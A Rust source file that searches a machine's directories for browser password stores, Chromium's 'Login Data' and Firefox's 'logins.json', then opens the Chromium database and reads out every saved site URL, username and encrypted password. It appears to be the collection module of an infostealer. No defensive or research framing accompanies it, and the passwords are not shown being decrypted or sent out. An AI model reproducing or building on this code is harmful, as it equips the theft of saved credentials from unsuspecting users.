use rusqlite::{Connection, Error};
use std::path::PathBuf;
use std::fs;

pub fn connect_db(login_path: &str) -> Result<Vec<(String, String, Vec<u8>)>, Error> {
    let conn = Connection::open(&login_path)?;

    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")?;
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let username: String = row.get(1)?;
        let encrypted_password: Vec<u8> = row.get(2)?;
        Ok((url, username, encrypted_password))
    })?;

    let mut result = Vec::new();
    for row in rows {
        result.push(row?);
    }

    Ok(result)
}

pub fn list_files(main_path: PathBuf, login_data_files: &mut Vec<String>, file_data: &str) {
    match fs::read_dir(main_path) {
        Ok(paths) => {
            for path_result in paths {
                match path_result {
                    Ok(path) => {
                        if path.file_type().unwrap().is_dir() {
                            list_files(path.path(), login_data_files, file_data);
                        } else {
                            let clean_file = path.path().display().to_string();

                            if file_data == "Login Data" {
                                if clean_file.ends_with(file_data) {
                                    login_data_files.push(clean_file);
                                }
                            } else if file_data == "logins.json" {
                                if clean_file.ends_with(file_data) {
                                    login_data_files.push(clean_file);
                                }
                            }

                        }
                    },
                    Err(_e) => continue
                }
            }
        },
        Err(_e) => {},
    }
}